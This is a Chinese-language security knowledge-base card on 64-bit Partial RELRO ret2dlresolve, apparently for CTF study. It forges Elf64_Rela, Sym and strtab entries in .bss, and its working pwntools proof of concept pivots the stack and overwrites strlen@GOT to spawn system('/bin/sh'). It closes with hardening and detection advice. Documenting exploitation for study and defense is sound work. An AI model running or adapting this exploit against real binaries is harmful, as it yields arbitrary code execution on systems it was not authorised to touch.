---
id: binary-pwn-stack-ret2dlresolve-partial-relro-64-fake-reloc
title: 64 位 Partial RELRO 伪造 reloc_arg 与 Elf64_Sym/Rela 结构 ret2dlresolve
type: scenario
domain: binary
path: binary/pwn/stack
technique: ret2dlresolve
tags:
- pwn
- stack
- rop
- ret2dlresolve
- partial-relro
- elf64
- dynsym
- rela
- got
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V91
  verified_at: '2026-11-05T19:51:06+08:00'
  notes: 已对照原文与22图核对：Partial RELRO 下 .dynamic(0x403e08) 只读、.got.plt 可写；DT_STRTAB=0x4004b0/DT_SYMTAB=0x4003d8/DT_JMPREL=0x4005c0、strlen@GOT=0x404008、bss=0x404e00、leave=0x4011cf、strlen 片段=0x40126d、PLT0=0x401020；fake strtab/symtab(0x12)/jmprel、sym_index/reloc_arg 整除检查、pop rbp 触发与图22 getshell 均一致。原文无组件版本区间，未设 affected_versions；卡内 DT_VERSYM 段落为通用风险提示（原文未展开）。frontmatter无sources/source_url。
url: /docs/binary/pwn/stack/binary-pwn-stack-ret2dlresolve-partial-relro-64-fake-reloc/
draft: false
kb_aliases:
- 64 位 fake reloc ret2dlresolve
- 伪造 Elf64_Rela
- 伪造 Elf64_Sym
- partial relro ret2dlresolve 64
- 大偏移 reloc_arg
- DT_JMPREL 越界查表
---

## 一句话结论

64 位 Partial RELRO 下 `.dynamic` 只读，无法像 No RELRO 那样改写 `DT_STRTAB`；但 `reloc_arg`（PLT 第二段压栈的值或攻击者在栈上构造的值）仍可控：把它设成 `(fake_jmprel - DT_JMPREL) / 0x18`，`_dl_fixup` 就会从 `.bss` 的假 `Elf64_Rela` 取 `r_info`/`r_offset`，再按假 `r_info` 找到假 `Elf64_Sym`、按 `st_name` 找到假 strtab 中的 `system`，最终把 `system` 地址写入 `strlen@GOT` 并跳转执行，`/bin/sh` 作为参数即可 getshell。

## 原理

- **Partial RELRO 的限制**：`-z relro -z lazy` 使 `.dynamic`（以及 `.got` 的非 PLT 部分）只读，但 `.got.plt` 仍可写、延迟绑定仍开启；因此不能改 `DT_STRTAB`，但可以伪造 `reloc_arg` 让解析器越界到 `.bss` 取表。
- **`_dl_fixup` 的查表公式**（64 位）：
  ```c
  reloc = DT_JMPREL + reloc_arg;                 // Elf64_Rela，24 字节
  sym   = &DT_SYMTAB[R_SYM(reloc->r_info)];      // Elf64_Sym，24 字节
  name  = DT_STRTAB + sym->st_name;              // 字符串表
  rel_addr = l->l_addr + reloc->r_offset;        // 要写入的 GOT 地址
  // _dl_lookup_symbol_x(name, ...) -> value
  ```
  三个表基址来自只读的 `.dynamic` 不可改，但 `reloc_arg` 可控且可以是很大的偏移；`r_info` 的高 32 位是符号索引、低 32 位是重定位类型（`R_X86_64_JUMP_SLOT`=7）。
- **伪造四组数据**：
  1. **fake strtab**：只需包含 `system\0`（加 `\0` 对齐），放在 `.bss` 已知地址。
  2. **fake Elf64_Sym**（0x18 字节）：`st_name` = fake_strtab - 真实 DT_STRTAB；`st_info` 填 `0x12`（GLOBAL FUNC，按原表类型）；`st_other/st_shndx/st_value/st_size` 可置 0（原文测试填其他值也不影响解析）。
  3. **fake Elf64_Rela**（0x18 字节）：`r_offset` 填目标 GOT（原文 `strlen@GOT`）；`r_info = (sym_index << 32) | 7`；`r_addend` 不参与解析，可填 0。
  4. **sym_index / reloc_arg**：`sym_index = (fake_sym - DT_SYMTAB) / 0x18`，`reloc_arg = (fake_jmprel - DT_JMPREL) / 0x18`；两者都必须整除，否则调整 `.bss` 布局或伪造位置。
- **触发方式**：正常 PLT 第二段是 `push reloc_arg; jmp PLT0`；如果直接 `call` 过去，call 会把返回地址压栈，破坏“栈顶是 reloc_arg”的约定。因此原文先把 `strlen@GOT` 改成 `pop rbp; ret` gadget，利用程序的 `strlen` 代码片段（`lea rax,[rbp+buf]; mov rdi,rax; call strlen`）让 `rdi` 指向 `/bin/sh`，`pop rbp; ret` 弹掉 call 的返回地址并把栈顶留给 `reloc_arg`，再跳到 `jmp_dl`（PLT 第二段后半段 `jmp PLT0`）触发 `_dl_runtime_resolve`。
- **栈与对齐**：`_dl_runtime_resolve` 需要较大的栈空间；原文把 ROP/伪造结构放在 `.bss`，用 `leave; ret` 栈迁移，并让 fake Sym 落在 0x18 对齐的位置；`bss-8` 等微调用于让 ROP 链与 fake 表项对齐。
- **版本检查**：64 位 glibc 会用 `DT_VERSYM` 做符号版本校验；`sym_index` 过大可能越界读取。原文通过选择 `.bss` 地址/对齐让该索引落在安全位置（或该版本不触发崩溃）；换 libc/二进制时需重点验证，必要时改用假的 `link_map` 把 `DT_VERSYM` 置空（见关联卡）。
- **与 32 位/伪 link_map 的区别**：32 位 `Elf32_Rel` 是 8 字节、`sym` 16 字节、`reloc_arg` 是字节偏移；64 位是 24 字节，索引按 24 整除，版本检查更复杂。伪造 link_map 则是从 `l_info` 层面完全控制表基址，不需要大 `reloc_arg` 越界。

## 触发条件

- 64 位 ELF，Partial RELRO（`-z relro -z lazy`）、NX；`.got.plt` 可写、`.dynamic` 只读。
- 存在栈溢出/可控返回地址与可控 RBP（或等价栈迁移原语），能把伪造结构写入地址已知的 `.bss`/可写段。
- 非 PIE 或已知基址，便于计算 `DT_JMPREL`、`DT_SYMTAB`、`DT_STRTAB`、`.bss` 地址。
- 目标 glibc 的 `_dl_fixup` 版本检查不会因大 `sym_index` 崩溃；`sym_index*0x18` 与 `reloc_arg*0x18` 必须分别等于偏移。
- `_dl_runtime_resolve` 有足够栈空间；必要时用 `leave; ret` 迁移到 `.bss` 大块空间。

## 利用步骤

1. 用 `readelf -d/-r/-s` 或 IDA 获取 `DT_JMPREL`、`DT_SYMTAB`、`DT_STRTAB`、`strlen@GOT`、`.bss` 地址与 `leave; ret`/`read`/`strlen` gadget。
2. 第一次栈溢出控制 RBP 指向 `.bss+0x70-8`（read 参数为 rbp-0x70），返回到 `read`，把后续 payload 写入 `.bss`。
3. 在 `.bss` 布置 `fake_strtab`（`system\0\0`）、`fake_symtab`（0x18 字节，`st_name` 为 fake_strtab 相对真实 DT_STRTAB 的偏移，`st_info=0x12`）、`fake_jmprel`（`r_offset=strlen@GOT`，`r_info=(sym_index<<32)|7`）。
4. 计算并校验 `sym_index = (fake_sym - symtab)/0x18`、`reloc_arg = (fake_rela - jmprel)/0x18`；不整除就调整 `.bss` 偏移/填充。
5. 构造第一段 ROP：把 `strlen@GOT` 改写为 `pop rbp; ret`，并用 `read` 写入第二段 ROP/伪造结构；用两次 `leave; ret` 把栈迁到 `.bss`。
6. 第二段 ROP：控制 RBP 使 `rbp+0x70` 指向 `/bin/sh\x00`；返回到 `strlen` 代码片段（设置 `rdi=/bin/sh` 并 `call strlen`，实际跳到 `pop rbp; ret`）；栈上紧跟 `jmp_dl` 与 `reloc_arg`。
7. `_dl_fixup` 用 fake `Elf64_Rela/Sym/strtab` 解析出 `system`，写入 `strlen@GOT` 并跳转；`rdi` 指向 `/bin/sh`，执行 `system("/bin/sh")`。
8. 成功后交互；若崩溃在 `_dl_fixup`，检查 `sym_index` 对齐/版本检查、fake 结构地址可读、栈空间与 `reloc_arg` 计算。

## PoC

```python
from pwn import *

def main():
    bss = 0x404e00
    read_ = 0x4011b8
    # 第一次溢出：控制 rbp 到 bss，返回到 read 写后续数据
    buf = b"a" * 0x70 + p64(bss + 0x70 - 8) + p64(read_)
    io.send(buf)
    pause()

    fake_strtab = b"system\x00\x00"
    strtab = 0x4004b0
    str_offset = bss - strtab + 0x28
    fake_symtab = p32(str_offset) + p32(0x12) + p32(0) * 4

    strlen_got = 0x404008
    symtab = 0x4003d8
    sym_offset = bss - symtab + 0x28 + 0x8
    sym_index = sym_offset // 0x18
    r_info = sym_index << 32 | 0x7
    fake_jmprel = p64(strlen_got) + p64(r_info)

    if sym_index * 0x18 != sym_offset:
        print("error: sym_offset is not good.")
        exit()

    leave = 0x4011cf
    ROP_chain_1 = p64(strlen_got + 0x70) + p64(read_)

    jmprel = 0x4005c0
    reloc_offset = bss - jmprel + 0x28 + 0x28
    reloc_arg = reloc_offset // 0x18
    jmp_dl = 0x401020
    strlen_ = 0x40126d
    ROP_chain_2 = p64(bss + 0x48 + 0x70) + p64(strlen_) + p64(jmp_dl) + p64(reloc_arg)

    if reloc_arg * 0x18 != reloc_offset:
        print("error: reloc_offset is not good.")
        exit()

    buf = ROP_chain_1 + ROP_chain_2
    buf += fake_strtab
    buf += fake_symtab
    buf += b"/bin/sh\x00"          # 填充 fake_jmprel 前部并保持 0x18 对齐
    buf += fake_jmprel
    buf = buf.ljust(0x70, b"a")
    buf += p64(bss - 8) + p64(leave) + p64(leave)
    io.send(buf)
    pause()

    pop_rbp = 0x40117d
    buf = p64(pop_rbp).ljust(0x70, b"a")
    buf += p64(bss + 0x10 - 8) + p64(leave) + p64(leave)
    io.send(buf)
    return

io = process("./partial_relro_64")
main()
io.interactive()
```

```text
# 关键地址（原文示例，需按目标重算）：
# bss=0x404e00, strlen@GOT=0x404008, DT_SYMTAB=0x4003d8, DT_STRTAB=0x4004b0,
# DT_JMPREL=0x4005c0, leave=0x4011cf, strlen 片段=0x40126d, PLT0=0x401020
# sym_offset 与 reloc_offset 都必须被 0x18 整除。
```

## 变体与关联

- **变体：32 位 Partial RELRO**：`Elf32_Rel` 8 字节、`Elf32_Sym` 16 字节，`reloc_arg` 是字节偏移；见 [[binary-pwn-stack-ret2dlresolve-partial-relro-32-fake-reloc]]。
- **变体：64 位伪造 link_map**：直接控制 `l_info` 表基址、把 `DT_VERSYM` 置空，避开大 `sym_index` 的版本检查；见 [[binary-pwn-stack-ret2dlresolve-partial-relro-64-fake-linkmap]]。
- **变体：No RELRO**：`.dynamic` 可写时直接改 `DT_STRTAB` 更简单；见 [[binary-pwn-stack-ret2dlresolve-no-relro-dystrtab]]。
- **变体：pwntools 自动化**：`Ret2dlresolvePayload` 可生成 fake 结构，但 64 位版本检查/对齐仍需按目标调整。
- **关联**：栈迁移、`leave; ret`、`pop rbp; ret`、ret2csu、GOT 覆写；`_dl_fixup` 的 `DT_VERSYM` 处理。
- **边界**：Full RELRO 关闭延迟绑定；PIE 隐藏表地址；glibc 版本/`DT_VERSYM` 布局不同可能导致崩溃；`sym_index`/`reloc_arg` 不整除或 fake 结构未对齐会解析失败。

## 检测与防御

- **编译加固**：Full RELRO + BIND_NOW（`-Wl,-z,relro,-z,now`）关闭延迟绑定，本手法失效；PIE+ASLR 隐藏 `.bss`/GOT/动态表地址。
- **运行期检测**：监控异常大的 `reloc_arg`、`.got.plt` 中 `strlen/puts` 等表项指向非 libc 区域、`.bss` 出现形似 `Elf64_Rela/Sym` 的结构；`_dl_fixup` 的解析结果与符号名不匹配。
- **限制**：seccomp 限制 `execve`；只读映射保护 `.dynamic`；开启 glibc 的 `LD_BIND_NOW`/`-z now`。
- **CTF 环境**：保持 Partial RELRO 的题目可通过检查 `.bss` 伪造结构与异常 `reloc_arg` 来判题；实际产品应默认 Full RELRO。
